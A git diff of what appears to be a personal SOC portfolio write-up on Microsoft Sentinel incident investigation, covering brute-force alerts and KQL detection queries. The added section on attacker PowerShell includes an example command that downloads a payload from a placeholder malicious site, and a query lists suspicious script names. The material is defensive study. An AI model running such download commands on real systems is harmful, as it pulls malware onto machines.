@@ -37,7 +37,9 @@ To develop an understanding of Microsoft Sentinel and how to effectively navigat
 </p>
 
 <b>Screenshot1:</b> Shows the creation of the alert using a specific KQL query for brute-force and entity mapping to generate the results.<br>
+
 <b>Screenshot2:</b> Shows the alert has been triggered as an incident in Sentinel, assigning the task to myself and setting the status to active to work on the incident.<br>
+
 <b>Screenshot3:</b> Shows the investigation map identifying the public IP addresses involved in the brute-force attack, along with the targeted hosts/devices. To generate the investigation graph, I assigned the incident to myself and changed the status to Active within Microsoft Sentinel. It is important during the investigation process to document the malicious IP addresses and affected hosts for further analysis, containment, and escalation activities.
 
 <h3>Microsoft Defender for Endpoint</h3>
@@ -167,11 +169,10 @@ Once the investigation has been completed, review and condense the investigation
 
 `Sentinel - Threat Management - Incidents - Search for Incident - View Full Details → Activity Log - Post Investigation Notes - Change Status: Closed`
 
-<h3>KQL Query – Detect Downloaded PowerShell Scripts</h3>h3>
+<h3>KQL Query – Detect Downloaded PowerShell Scripts</h3>
 
 `let TargetHostname = "windows-target-1"; 
 let ScriptNames = dynamic(["eicar.ps1", "portscan.ps1", "pwncrypt.ps1"]);
-
 DeviceProcessEvents
 | where DeviceName == TargetHostname
 | where FileName =~ "powershell.exe"
@@ -184,7 +185,10 @@ DeviceProcessEvents
 
 <h3>Malicious PowerShell Commands Used by Attackers & KQL Detection Queries</h3>
 
-Invoke-WebRequest; 
+<b>Invoke-WebRequest:</b> downloading malware, pulling payloads, retrieving scripts from external servers
+
+PowerShell Command
+`Invoke-WebRequest http://malicious-site/payload.exe`
 
 
 <h2>Potential Impossible Travel</h2>
@@ -213,7 +217,7 @@ SigninLogs
 <b>Screenshot2:</b> Shows .<br>
 <b>Screenshot3:</b> Shows  .<br>
 
-<h3>Detection & Analysis Section:</h3>
+<h3>Detection & Analysis Section</h3>
 
 <b>Prepare:</b> Document roles, responsibilities, and procedures. Ensure tools, systems, and training are in place.
 
